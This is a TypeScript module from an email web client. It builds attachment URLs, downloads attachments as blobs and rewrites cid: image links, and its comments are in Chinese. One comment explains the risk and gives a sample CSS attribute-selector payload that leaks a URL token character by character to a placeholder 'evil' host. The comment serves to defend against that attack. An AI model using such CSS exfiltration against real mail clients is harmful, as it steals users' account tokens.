import { auth } from '@/lib/auth'
import api from '@/lib/api'
import type { Attachment } from '@/lib/types'

/** 可预览的 MIME 类型前缀（图片 / PDF）。 */
const PREVIEWABLE = /^(image\/|application\/pdf)/

/** 判断附件是否可在浏览器中直接预览。 */
export function isPreviewable(a: Attachment): boolean {
  return PREVIEWABLE.test(a.content_type || '')
}

/**
 * 返回带 token 的附件访问 URL（用于 img/iframe/新标签预览）。
 * token 走 query 参数而非请求头，因为 img src / a href 无法附带自定义请求头。
 *
 * ⚠⚠ 只要这个 URL 会被写进邮件正文文档（cid: 内联图改写），就**必须**传 token 参数，
 * 传详情接口给的 attachment_token，绝不能让它退回到 access token。
 *
 * 原因：正文文档里的内容由发件人完全控制。开启远程内容后 style-src 允许内联样式，
 * 邮件自带的 <style> 块可以写 `img[src^="…access_token=eyJhb"]{background:url(https://evil/1)}`
 * 这样的属性选择器，用「命中就发一个远程请求」的方式把 token 逐字符问出来，
 * 全程不需要执行任何脚本，CSP 的 script-src 与沙箱都拦不住。
 * access token 一旦外泄就是整个账号；attachment_token 只能取这一封邮件的附件、一小时过期。
 */
export function attachmentUrl(
  messageId: number,
  idx: number,
  opts?: { download?: boolean; token?: string },
): string {
  // 没有 attachment_token（后端尚未升级 / 详情来自旧缓存）才退回 access token
  const t = opts?.token || auth.access || ''
  const dl = opts?.download ? '&dl=1' : ''
  return `/api/v1/messages/${messageId}/attachments/${idx}?access_token=${encodeURIComponent(t)}${dl}`
}

/**
 * 通过 axios（Bearer 头）以 blob 方式下载附件并触发浏览器另存为。
 * 不将 token 暴露到 URL 中。
 */
export async function downloadAttachment(
  messageId: number,
  idx: number,
  filename: string,
): Promise<void> {
  const res = await api.get(`/messages/${messageId}/attachments/${idx}?dl=1`, {
    responseType: 'blob',
  })
  const url = URL.createObjectURL(res.data as Blob)
  const a = document.createElement('a')
  a.href = url
  a.download = filename || 'attachment'
  document.body.appendChild(a)
  a.click()
  a.remove()
  // 延迟释放：a.click() 触发的下载是异步发起的，立即 revoke 在部分浏览器
  // （Firefox / 大文件）会导致下载到空文件，故留出时间再释放。
  setTimeout(() => URL.revokeObjectURL(url), 1000)
}

/**
 * 将正文 HTML 中的 `cid:` 引用改写为附件接口 URL，
 * 使内联图片（如签名图、嵌入图）能在 iframe 中正常渲染。
 *
 * content_id 比对忽略大小写，同时兼容带尖括号 `<cid>` 的形式（仅匹配括号内的值）。
 * 前导字符兼容引号、括号与无引号属性（`src=cid:xxx`）。
 *
 * ⚠ token 必须传详情接口给的 attachment_token：改写结果直接落进邮件正文文档，
 * 而那份文档的内容由发件人控制，可以用 CSS 属性选择器把 URL 里的令牌逐字符外泄。
 * 完整说明见 attachmentUrl。
 */
export function rewriteCidLinks(
  html: string,
  messageId: number,
  attachments: Attachment[],
  token?: string,
): string {
  return html.replace(/(["'(=])cid:([^"')\s>]+)/gi, (m, pre, cid) => {
    // 去掉可能的 < > 包裹
    const cidClean = String(cid).replace(/^<|>$/g, '').toLowerCase()
    const idx = attachments.findIndex((a) => {
      if (!a.content_id) return false
      return a.content_id.replace(/^<|>$/g, '').toLowerCase() === cidClean
    })
    if (idx < 0) return m
    return pre + attachmentUrl(messageId, idx, { token })
  })
}
